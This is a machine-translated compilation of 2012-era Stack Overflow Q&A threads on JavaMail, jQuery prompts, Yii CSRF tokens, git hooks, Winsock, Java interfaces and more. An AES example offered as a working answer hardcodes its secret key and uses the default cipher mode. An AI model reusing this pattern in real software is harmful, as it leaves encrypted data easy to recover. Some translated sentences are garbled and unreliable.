        } catch (MessagingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        //msg.setSentDate(new Date());
        try {
            msg.setSubject( "Hello World!" );
        } catch (MessagingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        //--[ Create the body of the mail
        try {
            msg.setText( "Hello from my first e-mail sent with JavaMail" );
        } catch (MessagingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        //--[ Ask the Transport class to send our mail message
        try {
            Transport.send( msg );
        } catch (MessagingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }   
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-11-14T07:48:39.990

我在使用 java 8 时遇到了这个问题。更新此属性后问题解决了

```
props.put("mail.smtp.ssl.trust", "smtp.gmail.com")

if used spring boot in application.property

spring.mail.properties.mail.smtp.ssl.trust = smtp.gmail.com 
```

我认为这会有所帮助。

# jquery - 显示带有文本字段的警报框

> ID：13599236
> 
> 赞同：5
> 
> 时间：2012-11-28T06:38:29.867
> 
> 标签：jquery

我是 jquery 的新手。每当页面加载时，我想在其中显示一个带有 TextBox 字段的警报框。像这样的东西：

```
Enter Your Username: //Title
___________________  //TextBox field (value will be stored in var for later use)

                OK   //Button 
```

我知道

```
var username = "username";  //already entered message
alert(username); 
```

如何实现上面的Alert Box？我应该手动编码吗？最好
举个例子。`jQuery`我正在尝试为我的聊天应用程序执行此操作，其中需要在聊天中显示用户名。我搜索了很多，但找不到任何与 asp.net 和 jquery 相关的有用信息。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-28T06:41:12.240

只需使用好的旧 JavaScript：

```
var text = prompt("prompt", "textbox's intial text"); 
```

[现场演示](http://jsfiddle.net/tHD4D/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T06:48:21.050

> 最好在 jQuery 中给出一个示例。

[jQuery Impromptu](http://trentrichardson.com/Impromptu/)`window.prompt`提供了一个美观的 JavaScript Prompt，它和 JavaScripts方法一样容易调用：

```
//Simple Prompt
$.prompt('Example 1');

//Opacity of the modal
$.prompt('Example 3',{ opacity: 0.2 });

//Adding Callbacks
function mycallbackfunc(e,v,m,f){
alert('i clicked ' + v);
}

$.prompt('Example 8',{ callback: mycallbackfunc }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:43:58.550

您可以使用[JQueryUI Dialog](http://jqueryui.com/dialog/#modal-form) 在对话框中显示表单。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T06:44:06.243

“我想显示一个带有 TextBox 字段的警报框，”。根本不可能带有文本字段的警报框..（从我学到的东西到现在）....你可以使用其他jquery插件，如对话框

[http://jqueryui.com/dialog/](http://jqueryui.com/dialog/)

做同样的事情..

或使用提示的经典方式

```
var name=prompt("Please enter your name","Harry Potter"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T06:47:20.363

试试这个：

```
$(document).ready(function(){
var msg = window.prompt("Write your name", "Name");
alert(msg);
});​ 
```

# security - YII 框架中的 CSRF 代币多久更换一次？

> ID：13599240
> 
> 赞同：5
> 
> 时间：2012-11-28T06:39:00.240
> 
> 标签：security, yii, token, csrf, csrf-protection

我最近阅读了有关 csrf 令牌的信息。我正在使用 YII 框架来开发我的项目。我在 config/main.php 中启用了 csrf 验证，yii 将令牌放入隐藏的表单字段中。并检查令牌是否有效。一切安好。但是我观察到，当我刷新并且页面中的所有表单都使用相同的令牌时，CSRF 令牌的值并没有改变。

这让我很困惑。如果 csrf 令牌没有改变，那么任何黑客都可以在他的请求中使用该令牌，并且能够产生一个有效的请求。那么 csrf 令牌如何提供安全性呢？YII框架有问题吗？还是我错过了什么？我希望我确实错过了一些东西。如果我们必须手动生成令牌，请告诉我如何生成和验证（最好在 YII 框架中）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T06:59:56.410

为每个会话实现 Csrf 令牌生成。 [查看](http://www.yiiframework.com/wiki/274/how-to-validate-csrf-token-with-session)

黑客如何获取生成到您会话的令牌？

每个请求令牌生成也有一个程序，但我认为这在 yii 中不是一个好方法。 [每个请求令牌生成的问题](http://www.yiiframework.com/forum/index.php/topic/28716-regenerate-csrf-token-per-each-request/)

# asp.net - “Url 的正则表达式不能在前缀和空格中以 www 开头

> ID：13599251
> 
> 赞同：0
> 
> 时间：2012-11-28T06:39:36.777
> 
> 标签：asp.net, c#-4.0

“网址不能以前缀和空格中的 www 开头”的正则表达式请帮助我。

例如：goole.com 是正确的

例如：www.google.com 不被接受

例如：不接受 www.google.com

前缀不是 www。而不是以空格开头-------->显示失败

googlewwwwwwwwww.com ---->显示成功

提前致谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:15:10.797

这是一个非正则表达式解决方案。

```
string str = "goole.com";
Uri tempUri;
if (!str.StartsWith(" ") //shouldn't start with space
    && !str.StartsWith("www") //shoudn't start with www
    && Uri.TryCreate(str, UriKind.RelativeOrAbsolute, out tempUri) //should be 
                                                                   //a valid Uri
    )
{
    //valid url
}
else
{
    //invalid url
} 
```

# java - Java /Groovy - 打印浏览器名称，请求来自

> ID：13599252
> 
> 赞同：1
> 
> 时间：2012-11-28T06:39:51.037
> 
> 标签：java, grails, http-headers

在我的控制器中（我正在使用 grails MVC 框架），我想打印请求来自的浏览器的名称。

我试过java代码：

```
 String userAgent = request.getHeader("user-agent")
 println ("userAgent -->"+userAgent) 
```

它打印

```
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.91 Safari/537.11 
```

我正在使用谷歌浏览器，

如何获得确切的浏览器，请求来自哪里..？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:24:00.943

用户代理标头就是您所拥有的一切，因此您必须解析该字符串以获取确切的浏览器。

在您的情况下，您的用户代理字符串将告诉我们您正在`Chrome/23.0.1271.91`Windows XP 32 位（由 标识）上运行 Google Chrome 版本 23（由 标识`Windows NT 5.1`）。

解析用户代理的最简单方法是使用现有的库并让它为您完成，其中一个库是[用于用户代理信息的 Java 库](http://user-agent-utils.java.net/)。

# c# - 字符串到 varchar C#/SQL Server

> ID：13599257
> 
> 赞同：1
> 
> 时间：2012-11-28T06:40:07.433
> 
> 标签：c#, sql, sql-server, datatable, datarow

我有一个应用程序需要在列中存储一个值。值是代码中的字符串，列数据类型是`nvarchar`.

```
foreach (DataRow row in dt.Rows)
{
    //Generate a random length for randomKey range between 3 and 6 characters
    Random randKey = new Random();
    int randKeyLength = randKey.Next(3, 6);

    //calculate randomKeyString
    String randomKeyString = md5Prepare.gen_randomKeyString(randKeyLength);

    //add randomKeyString to database
    row["randomKey"] = randomKeyString;
} 
```

当我检查数据库时，“randomKey”列没有改变。这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:48:37.977

您没有在`DataRow`or上调用任何 Commit 方法`DataTable`。
您需要[`DataAdapter`](http://msdn.microsoft.com/en-us/library/system.data.common.dataadapter.aspx)and`DataSet`来实际更新数据库。

```
foreach (...)
{
    // your code here
}
DataSet dataSet = new DataSet();
dataSet.Tables.Add(dt);
SqlDataAdapter adapter = new SqlDataAdapter();
adapter.Update(dataSet); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:46:06.447

您设置值的操作没有任何问题。字符串在 C# 中是 unicode，nvarchar 也是如此。您只需要将值写回/插入到数据库中，因为您目前正在做的是操纵您从数据库中读取的内存表示。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:46:16.120

不要在 foreach 中创建 Random 对象的实例：而是在之前创建它。

单个 Random 实例生成的随机数序列应该是均匀分布的。通过快速连续地为每个随机数创建一个新的 Random 实例，您可能会为它们播种相同的值并让它们生成相同的随机数。当然，在这种情况下，生成的序列将远非均匀分布。

为了完整起见，如果您确实需要重新播种 Random，您将使用新种子创建 Random 的新实例：

```
rnd = new Random(newSeed); 
```

*感谢 Mehrdad Afshari*

# google-cloud-sql - 关闭 GAE 的 Google Cloud SQL

> ID：13599258
> 
> 赞同：0
> 
> 时间：2012-11-28T06:40:08.553
> 
> 标签：google-cloud-sql

我们可以在 Google App Engine 之外使用[Google Cloud SQL吗？](https://cloud.google.com/products/cloud-sql)

我也在寻找它的使用示例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T23:12:10.000

可以，但您必须使用自定义 JDBC 驱动程序。 [https://developers.google.com/cloud-sql/docs/external](https://developers.google.com/cloud-sql/docs/external) 您应该期待高延迟，因为您的客户端不会与 mysqld 位于同一位置。

您还可以将 JDBC 驱动程序用于管理工具： [https ://developers.google.com/cloud-sql/docs/admin_tools](https://developers.google.com/cloud-sql/docs/admin_tools)

# mysql - 将巨大的mysql插入拆分为多个文件建议

> ID：13599260
> 
> 赞同：1
> 
> 时间：2012-11-28T06:40:11.613
> 
> 标签：mysql, sql

我有一个需要导入的巨大 mysql 转储，我设法通过表插入拆分了 3gig 文件，其中一个表插入是 600MB，我想将它拆分为 100MB 的文件。所以我的问题是：是否有脚本或简单的方法可以将 600MB INSERT 语句拆分为多个 100MB 插入，而无需打开文件（因为这会杀死我的电脑）。

我试过 SQLDumpSplitter 但这没有帮助。

这就是我不能只运行 600MB 文件的原因：

[MYSQL 导入响应 'killed'](https://stackoverflow.com/questions/13581809/mysql-import-response-killed)

请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:02:44.217

在 Linux 上，拆分文件的最简单方法是[`split -l N`](http://linux.die.net/man/1/split)- 将每行拆分为几`N`行。

在 Windows 上，我对[HxD](http://mh-nexus.de/en/hxd/)非常幸运——它适用于大文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:46:37.893

您可以在 Textpad 软件上轻松打开 1GB 的文件。使用此软件打开文件并根据需要拆分查询。

下载 TextPad 软件[***TextPad的链接***](http://www.textpad.com/download/)

# git - git 在提交时显示最后检查

> ID：13599262
> 
> 赞同：0
> 
> 时间：2012-11-28T06:40:38.500
> 
> 标签：git, git-commit

当我进行 git 提交时，是否可以显示最后一次提交的文本。

我经常需要签入并与票号相关联，我总是倾向于忘记该号码并且必须返回并执行 git log 以找出先前的提交并获取票号，这会减少一点摩擦这只是包含在显示的提交评论中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:44:51.640

是的。您可以创建一个 post-commit-hook 来显示最后一次提交（最近推送的那个）的消息日志。

我建议您阅读 Pro Git 的[Git Hooks 部分](http://git-scm.com/book/en/Customizing-Git-Git-Hooks)。它甚至告诉你如何获得你的最后一次提交（`git log -1 HEAD`），但你可能只是想要`git show HEAD`或类似的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T08:19:54.670

您可以使用`prepare-commit-msg`钩子脚本在用于编辑下一次提交的消息的文件中添加有关最近提交的注释。一个基本的实现是：

```
#!/bin/sh
tmpf=`tempfile`
git show | sed 's/^/# /' > "$tmpf"
cat "$1" >> "$tmpf"
mv "$tmpf" "$1" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:47:03.387

您在 Linux 或 Mac 上使用命令行中的 git，您可以创建一个名为的 shell 脚本`gitcommit`：

```
git log -1
git commit $* 
```

然后使用`gitcommit ...`而不是`git commit ...`

# php - 在数组中搜索一个值并返回键

> ID：13599263
> 
> 赞同：0
> 
> 时间：2012-11-28T06:40:48.600
> 
> 标签：php, arrays, search

我的数组如下所示：

```
$myarr = array(
    1 => array(2, 4, 6, 7, 10, 11),
    2 => array(95, 5, 8, 15, 21)
); 
```

是否可以通过数组搜索例如。对于`8`然后返回值所在的键号？

例如。`95`是钥匙号码里面。`2`，那么如果它确实找到了`95`它应该返回`2`-`FALSE`否则。另一个例子：`11`在密钥号里面找到了。`1`，那么它应该返回`1`，`FALSE`否则。

有这样的PHP函数吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:50:31.630

我认为您正在寻找 array_walk() 和/或 array_walk_recursive()。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:48:49.557

简单的馅饼...我想您可以自己弄清楚...

```
function searchInMyArr($myarray, $search_term){
    $position = false;
    foreach ($myarray as $key => $subarray){
        if (in_array($search_term,$subarray){
            $position = $key;
            break;
        }
    }

    return $position;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:52:21.497

不，您的案例太具体，不太可能被其他人使用，因此它不在 PHP 本身中。

这是一个可能的解决方案

```
function search_array_multilevel($needle, $haystack) 
{
    foreach ($haystack as $index => $subarray) {
        if (in_array($needle, $subarray)) {
            return $index;
        }
    }
    return false;
 } 
```

# highcharts - 以高图为中心的轴标签

> ID：13599264
> 
> 赞同：0
> 
> 时间：2012-11-28T06:40:57.073
> 
> 标签：highcharts

[我在这里](http://jsfiddle.net/nagoba/Baeqm/)有一个自定义图表 我将标签属性设置为

```
labels: {
            formatter: function() {
                return Highcharts.dateFormat('%Y', this.value);
            },
                align:'center',
            x:150
        } 
```

我有一个显示年份的链接轴。我想要的是轴标签应该在两个极端的中心，如图所示。

![在此处输入图像描述](../Images/130655cf475476962999af9c4bab5b69.png)

我现在所做的是，我已将 x:150 赋予标签。但如果我调整浏览器窗口的大小，这将不起作用。有没有办法做到这一点？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T06:09:14.877

这是我找到它的方式。

而不是使用静态值，

我使用了 useHTML，并通过 CSS 样式定位标签。

```
 labels: {
            useHTML:true,
            formatter: function() {
                return '<span class="label">'+Highcharts.dateFormat('%Y', this.value)+'</span>';
            }
        } 
```

简单的例子[在这里](http://jsfiddle.net/Baeqm/1/)

# php - phpinfo 在 MAMP 中显示 date.timezone 警告

> ID：13599266
> 
> 赞同：0
> 
> 时间：2012-11-28T06:40:58.983
> 
> 标签：php, timezone, mamp, phpinfo

我在 MAMP 中运行 phpinfo() 函数，并收到以下警告，嵌入在 php 信息表中：

```
Warning: phpinfo() [function.phpinfo]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /Applications/MAMP/bin/mamp/phpinfo.php on line 2 
```

php.ini 文件中的 date.timezone 设置为“America/New_York”，警告仅比 phpinfo 表中反映的实际设置高出三行！

有人可以向我解释如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:47:23.530

您确定 .ini 文件中的时区周围没有引号吗？

date.timezone = America/New_York

[http://www.php.net/manual/en/timezones.america.php#85815](http://www.php.net/manual/en/timezones.america.php#85815)

# java - Commons Codec 中 decodeBuffer 方法的合适替代品

> ID：13599267
> 
> 赞同：1
> 
> 时间：2012-11-28T06:41:08.073
> 
> 标签：java, encryption, base64, aes, apache-commons

我有一段代码使用 AES 算法加密和解密，该算法使用 sun.misc.* 包。

后来我才知道使用那些使我遵循使用有效的 Apache 的 Commons Codec 的建议的软件包是错误的。

**之前的代码如下：**

```
import java.security.*;
import java.security.spec.InvalidKeySpecException;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;

import sun.misc.*;

public class AESencrp {
private static final String ALGO = "AES";
private static final byte[] keyValue = 
    new byte[] { 'T', 'h', 'e', 'B', 'e', 's', 't','S', 'e', 'c', 'r','e', 't', 'K', 'e', 'y' };

public static String encrypt(String Data) throws Exception {
    Key key = generateKey();
    Cipher c = Cipher.getInstance(ALGO);
    c.init(Cipher.ENCRYPT_MODE, key);
    byte[] encVal = c.doFinal(Data.getBytes());
    String encryptedValue = new BASE64Encoder().encode(encVal);
    return encryptedValue;
}

public static String decrypt(String encryptedData) throws Exception {
    Key key = generateKey();
    Cipher c = Cipher.getInstance(ALGO);
    c.init(Cipher.DECRYPT_MODE, key);
    byte[] decordedValue = new BASE64Decoder().decodeBuffer(encryptedData);
    byte[] decValue = c.doFinal(decordedValue);
    String decryptedValue = new String(decValue);
    return decryptedValue;
}

private static Key generateKey() throws Exception {
    Key key = new SecretKeySpec(keyValue, ALGO);
    return key;
}

} 
```

正如建议的那样，我删除了 sun.misc 并进行了以下更改。

**在 Apache 的公共编解码器中将 BASE64Encoder 类替换为 Base64 后：**

```
 public static String encrypt(String Data) throws Exception {
            Key key = generateKey();
            Cipher c = Cipher.getInstance(ALGO);
            c.init(Cipher.ENCRYPT_MODE, key);
            byte[] encVal = c.doFinal(Data.getBytes());
            byte[] encryptedValue = new Base64().encode(encVal);
            return new String(encryptedValue);
        } 
```

我无法找到合适的解密替代品，因为我遇到了以下问题：

```
byte[] decordedValue = new BASE64Decoder().decodeBuffer(encryptedData); 
```

我没有找到任何方法可以完成 decodeBuffer(String encryptedData) 的工作并返回一个解码值的字节数组。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T08:08:33.803

好的，那这个呢？

使用 apache Base64 util 类类似于 sun.misc.Base64Encoder。Apache Base64 类提供了许多重载方法，可以减轻您在字节和字符串之间的转换。

```
byte[] encodedBytes  = Base64.encodeBase64(testString.getBytes());

String decodedString = new String(Base64.decodeBase64(encodedBytes)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-17T14:57:04.053

```
public class EncryptionDecrption {

    private static final String ALGO = "AES";
    private static final byte[] keyValue = new byte[]{'T', 'h', 'e', 'R', 'o', 'o', 'K', 'n', 'a', 't','E','n', 'i', 'r','i','n'};

    public EncryptionDecrption(){

    }

    public static String setEncryptedString(String data) throws Exception {
        Key key = getKey();
        Cipher cipher = Cipher.getInstance(ALGO);
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encryptedValue = cipher.doFinal(data.getBytes("UTF-8"));

        return Base64.encodeToString(encryptedValue, Base64.DEFAULT);
    }

    public static String getDecryptedValue(String data) throws Exception {

        if(data != null) {
            Key key = getKey();
            Cipher cipher = Cipher.getInstance(ALGO);
            cipher.init(Cipher.DECRYPT_MODE, key);
            byte[] decodebyte = Base64.decode(data.getBytes("UTF-8"), Base64.DEFAULT);
            byte[] decValue = cipher.doFinal(decodebyte);

            return new String(decValue);
        }

        return null;
    }

    private static Key getKey() throws Exception {
        return new SecretKeySpec(keyValue, ALGO);
    }
} 
```

它适用于我的安卓系统。

# mercurial - 排除添加某些类型的文件（添加 -X 不起作用？）

> ID：13599270
> 
> 赞同：1
> 
> 时间：2012-11-28T06:41:12.767
> 
> 标签：mercurial

根据手册页

```
hg add -X [pattern] 
```

应该排除所有匹配`[pattern]`的文件被添加。男子条目是

> -X, --exclude 排除匹配给定模式的名称

但是，当我尝试使用`-X`它时，它不起作用。

```
hg add -X *.map
hg add -X "*.map" 
```

两者都包括所有子目录中的所有“.map”文件。例子：

> 添加 map_files/tRNAs/tRNAs_chr8.map
> 
> 添加 map_files/tRNAs/tRNAs_chr9.map
> 
> 添加 map_files/tRNAs/tRNAs_chrX.map

是什么赋予了？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T07:47:37.013

我认为（因为我懒得测试）

`hg add -X "set:**.map"`

会玩游戏（甚至可能没有 set: 部分），只是因为

> “*”字符匹配**单个目录中的任何字符串**

在@VonC页面提到的“使用模式识别文件”部分中注明

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:04:38.117

这种模式（Shell 风格的 glob 模式）应该会更好地工作：

```
hg add -X 'glob:*.map' 
```

“[第 7 章。文件名和模式匹配](http://hgbook.red-bean.com/read/file-names-and-pattern-matching.html)”页面详细介绍了可能的语法。

使用 re 模式（正则表达式），它可以`hg add -X '.*\.map'`（未测试）。

# tcp - 关闭后从套接字读取数据

> ID：13599274
> 
> 赞同：0
> 
> 时间：2012-11-28T06:41:40.660
> 
> 标签：tcp, vb6, winsock

使用 Visual Basic 6.0，我正在建立一个到 Web 服务器的 Winsock HTTP 连接，该连接发送数据并在之后立即关闭。（连接：保持活动，对此服务器没有任何好处）

这是我的一段代码：

```
sck.SendData "GET /? HTTP/1.1" & vbNewLine & _
             "Host: example.org" & vbNewLine & _
             "Connection: keep-alive" & vbNewLine & vbNewLine

'// Wait for full Data:
Dim DATA As String
While (Not isEOF(DATA)) And sck.State = sckConnected
    If sck.State = sckConnected Then sck.PeekData DATA
    Sleep 10: DoEvents
Wend

If sck.State <> sckConnected Then
    '// When this Fires, my data is missing the 25% of it's rest.
    '// It is received corectly acording to Wireshark, but Winsock
    '// closes the socket befor I can get the rest to the DATA variable.
    MsgBox "This happends randomly 10% of the times.", vbInformation
End If

Clipboard.Clear
Clipboard.SetText DATA
Msgbox DATA
sck.Close 
```

isEOF() 函数会检查数据是否已满且准备就绪（读取内容长度、< /html> 标记或空字符）。不需要在这里发布，因为它很大而且不是问题，相信我。

当你使用:`sck.GetData`或`sck.PeekData`一个已关闭的套接字时，你会得到一个错误。那么如何在套接字关闭后从套接字获取数据？

这里的重点是 10% 的时间，Winsock 会在我获得其余数据之前关闭套接字。我尝试了一切来解决这个问题（使用事件处理程序、GetData 而不是 PeekData 等），但我仍然随机收到与我正在连接的网络服务器相同的错误。

使用 Winsock 正确获取并等待数据的正确方法是什么？我在这段代码中做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T09:59:44.897

您的问题表现出几个误解。

1.  Winsock*永远不会*关闭套接字，除非*您*关闭它。如果遇到关闭的套接字，*则将*其关闭。

2.  如果对*等*方关闭*他的*套接字，则构成*连接的关闭。*但是，对等方已排队发送的所有数据仍将被发送，并且您仍将收到它，*在*收到 VB 中的任何 EOS 指示之前。然后您将收到 EOS，*您*应该在其上关闭您的套接字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:33:46.550

你可以试试下面的代码吗？

```
'1 form with :
'    1 winsock control : name=Winsock1
'    1 command button  : name=Command1
Option Explicit

Private Sub Command1_Click()
  With Winsock1
    .Connect "<your server>", <your port>
    Do
      DoEvents
    Loop Until .State = sckConnected
    .SendData <your command>
  End With 'Winsock1
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
  Dim strData As String
  Winsock1.GetData strData
  ProcessData strData
End Sub

Private Sub ProcessData(strData As String)
  Static strTotal As String
  strTotal = strTotal & strData
  If IsComplete(strTotal) Then 'your check to see if data is complete
    Winsock1.Close
  End If
End Sub 
```

我只运行了几次，并且在检索大块数据时从未错过任何数据（在数据完成之前涵盖了几个数据到达事件）

也一定要在 ProcessData 过程中的某个地方做你的其他事情，当然在做完你的事情之后清空 strTotal :)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-06-22T17:21:34.593

关闭一侧的套接字，然后从另一侧调用 recv 并检查返回值。

# ios - 如何将 UIActivityIndi cator 插入搜索栏文本字段？

> ID：13599275
> 
> 赞同：3
> 
> 时间：2012-11-28T06:41:42.657
> 
> 标签：ios, uisearchbar, uiactivityindicatorview

我想在搜索栏文本字段的右侧添加一个 UIActivityIndi​​cator。这样搜索栏将在从数据库中获取数据时继续显示加载状态。

对此有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-28T06:55:19.317

这是用微调器更改搜索放大镜的地方

```
UITextField *searchField = nil;  
for (UIView *subview in searchBar.subviews) {    
    if ([subview isKindOfClass:[UITextField class]]) {      
        searchField = (UITextField *)subview;      
        break;    
    }  
}    
if (searchField) {      
      UIActivityIndicatorView *spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];

       searchField.leftView = spinner;    

} 
```

或者，如果您愿意，可以在搜索栏视图上添加微调器

```
[self.searchBar addSubview:spinner]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T06:49:15.517

添加活动指示器作为搜索栏的子视图，如：

```
- (void)searchBarSearchButtonClicked:(UISearchBar *)searchBar
{
   UIActivityIndicatorView *spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];
   spinner.center = CGPointMake(160, 240);
   spinner.hidesWhenStopped = YES;
   spinner.tag = 7;
   [self.searchBar addSubview:spinner];
} 
```

当您想删除活动指示器时，您可以使用标签。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:55:06.883

添加我的评论作为答案。

你可以尝试使用`[searchbar addSubview:activityIndicator];`没有内置的方法来做到这一点。唯一可以更改的是使用方法的搜索图标`setImage:forSearchBarIcon:state:`。这可用于在搜索栏中添加不同的图像。[搜索栏上的 Apple 文档。](http://developer.apple.com/library/ios/#documentation/uikit/reference/UISearchBar_Class/Reference/Reference.html)一种解决方法是遍历搜索栏的子视图并将活动指示器添加到所需位置的子视图。

# java - Java - 带接口的受保护修饰符

> ID：13599276
> 
> 赞同：0
> 
> 时间：2012-11-28T06:41:46.073
> 
> 标签：java, interface, polymorphism

```
public interface ICalculator {

    public double multi(double a, double b);

    public int add(int a, int b);

    public int sub(int a, int b);
}

public class Calculator extends ICalculator {

    protected int add(double a, double b) {
        return a+b;
    }

    public double sub(int zahl1, int zahl2 ) {
        return a*b;
    }
} 
```

为什么我不能在类计算器中使用受保护的方法？我的回答是“受保护”在同一类和子类中是否有用。好吧，我难道不认为接口实现的类中的方法也被继承，就像子类一样。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-28T06:45:27.817

您不能对在子类中重写的方法添加更多限制。同样，您不能对从接口实现的方法添加更多限制。

现在，由于默认情况下定义在接口中的方法 - `public`（是的，您不需要显式编写它），因此您不能`protected`在实现类中使用您的方法。

原因很简单，当您使用多态性时，您可以实例化您的`implementing class`并将其引用存储在`interface type`.

```
ICalculator calc = new Calculator();  //valid

calc.add(1, 2);   // Compiler sees ICalculator method. 
```

现在，当您`add`使用引用调用方法时`ICalculator`，编译器只会看到定义在 中的方法`ICalculator`，并相应地批准访问。但是在运行时，调用的实际方法是表单`Calculator`类，现在发生的情况是，如果该方法实际上是从 a`different package`和`non-subclass`--调用的`BOOOOOM`，它会在运行时崩溃。

这就是为什么它是不允许的。

* * *

当您添加额外的`checked exception`. 编译器会再次阻止你。但是，是的，您可以添加一个额外的`Unchecked Exception`，因为这些只是被`Compiler`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-28T06:52:26.683

来自[Java 语言规范，§9.4](http://docs.oracle.com/javase/specs/jls/se7/html/jls-9.html#jls-9.4)：

> 接口主体中的每个方法声明都是隐式公共的（第 6.6 节）。
> 
> 接口主体中的每个方法声明都是隐式抽象的，因此它的主体始终由分号表示，而不是块。
> 
> 允许但不鼓励为接口中声明的方法冗余地指定 public 和/或 abstract 修饰符。

并来自[JLS，§8.4.8.3](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.4.8.3)：

> 覆盖或隐藏方法的访问修饰符（第 6.6 节）必须提供至少与覆盖或隐藏方法一样多的访问...

将这两部分的规则放在一起，得出的结论是，作为接口实现一部分的任何方法都必须是`public`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T06:48:39.083

*Java 中的接口是其客户端*的类的使用契约。所以他们所有的方法都是公开的，你不能对被覆盖的方法施加更多的限制。

# maven-2 - 嵌入式码头网络应用服务器

> ID：13599277
> 
> 赞同：2
> 
> 时间：2012-11-28T06:41:47.293
> 
> 标签：maven-2, embedded-jetty

我正在尝试构建一个带有**内置 Web 服务器的 Web 应用程序，并在**[此处](https://gist.github.com/1054400)找到了源文档。本教程使用 Maven 构建具有**所需**设置的初始项目结构。使用的命令是

mvn archetype:generate -DarchetypeCatalog=http://maven.publicstaticvoidmain.net/archetype-catalog.xml -DarchetypeGroupId=net.publicstaticvoidmain -DarchetypeArtifactId=embedded-jetty-archetype

但是运行此命令会出现错误

```
[WARNING] Error reading archetype catalog http://maven.publicstaticvoidmain.net/archetype-catalog.xml 
```

我是 Maven 新手，所以无法弄清楚我得到的实际问题是在全局存储库中找不到目录。什么是正确的解决方法？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-03T07:54:59.670

是的，目录不存在于您指向 url 的位置。然而，你想做的可以在[这里找到](http://www.jamesward.com/2011/08/23/war-less-java-web-apps)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:56:40.013

您指的是一个非功能性网站 [http://maven.publicstaticvoidmain.net](http://maven.publicstaticvoidmain.net)。

由于上述站点已不存在，因此该示例现在不合适了。

您是否正在寻找与独立网络应用程序相关的内容 - [http://pineapplesoftware.blogspot.in/2012/02/how-to-make-standalone-web-application.html](http://pineapplesoftware.blogspot.in/2012/02/how-to-make-standalone-web-application.html)

# c# - FileInfo 抛出有关文件的错误

> ID：13599278
> 
> 赞同：-1
> 
> 时间：2012-11-28T06:41:48.263
> 
> 标签：c#

我有以下代码

```
 string[] dfFileWildCards = Helper.DataFeedsWildCards.Split(',');
            string[] dfOriginalFilesPath = Directory.GetFiles(Helper.DataFeedsPath).Where(file => new FileInfo(file).CreationTime.Date == DateTime.Now.Date).ToArray();

            Helper.MyWriteLine("-->DataFeeds Folder: " + Helper.DataFeedsPath);
            Helper.MyWriteLine("-->WildCards: " + Helper.DataFeedsWildCards);
            Helper.MyWriteLine("-->There are " + dfOriginalFilesPath.Length + " files");

            foreach (string filePath in dfOriginalFilesPath)
            {
                Helper.MyWriteLine("Checking " + filePath.ToLower());
                FileInfo file = new FileInfo(filePath.ToLower());

                foreach (string dfFileWildCard in dfFileWildCards)
                {
                    if (
                        file.Replace(" ", "").Name.IndexOf(dfFileWildCard.Replace(" ", ""), StringComparison.OrdinalIgnoreCase) > -1
                        &&
                        file.LastWriteTime.Date == DateTime.Now.Date
                        )
                    {
                        filesToCopy.Add(filePath.ToLower());
